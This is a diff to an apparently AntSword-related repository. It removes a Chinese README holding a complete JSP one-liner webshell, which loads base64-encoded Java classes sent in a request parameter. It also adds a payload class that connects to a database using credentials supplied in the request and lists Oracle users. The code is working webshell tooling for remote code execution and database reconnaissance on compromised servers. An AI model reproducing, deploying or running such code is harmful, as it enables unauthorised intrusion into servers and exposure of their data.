@@ -1,39 +1,10 @@
-# JspForAntSword
-中国蚁剑JSP一句话Payload
-
-详细介绍： https://yzddmr6.tk/posts/antsword-diy-3/
-
-环境： jdk1.6  tomcat7
-
-编译命令
-
-```
-javac -cp "D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar" Test.java
-```
-
-保存编译后的class字节码
-
-```
-base64 -w 0 Test.class > Test.txt
-```
-
-Shell：
-
-```
-<%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("ant");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
-```
-
-
-
-Demo.java
-
-```
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
 import java.io.ByteArrayOutputStream;
+import java.sql.*;
 
-public class Demo {
+public class showDatabases {
     public String encoder;
     public String cs;
     @Override
@@ -51,10 +22,8 @@ public class Demo {
             response.setCharacterEncoding(cs);
             String var0 = EC(decode(request.getParameter("var0")+""));
             String var1 = EC(decode(request.getParameter("var1")+""));
-            String var2 = EC(decode(request.getParameter("var2")+""));
-            String var3 = EC(decode(request.getParameter("var3")+""));
             output.append("->" + "|");
-            //sb.append(SysInfoCode(var0));
+            sb.append(showDatabases(var0,var1));
             output.append(sb.toString());
             output.append("|" + "<-");
             page.getOut().print(output.toString());
@@ -89,8 +58,40 @@ public class Demo {
         }
         return str;
     }
+    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
+            throws Exception {
+        String ret = "";
+        conn = (EC(conn));
+        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
+        Class.forName(x[0].trim());
+        String url = x[1];
+        Connection c = DriverManager.getConnection(url,x[2],x[3]);
+        Statement stmt = c.createStatement();
+        ResultSet rs = stmt.executeQuery(sql);
+        ResultSetMetaData rsmd = rs.getMetaData();
+
+        if (needcoluname) {
+            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
+                String columnName = rsmd.getColumnName(i);
+                ret += columnName + columnsep;
+            }
+            ret += rowsep;
+        }
+
+        while (rs.next()) {
+            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
+                String columnValue = rs.getString(i);
+                ret += columnValue + columnsep;
+            }
+            ret += rowsep;
+        }
+        return ret;
+    }
+    String showDatabases(String encode, String conn) throws Exception {
+        String sql = "SELECT USERNAME FROM ALL_USERS ORDER BY 1";
+        String columnsep = "\t";
+        String rowsep = "";
+        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
+    }
 
 }
-
-```
-
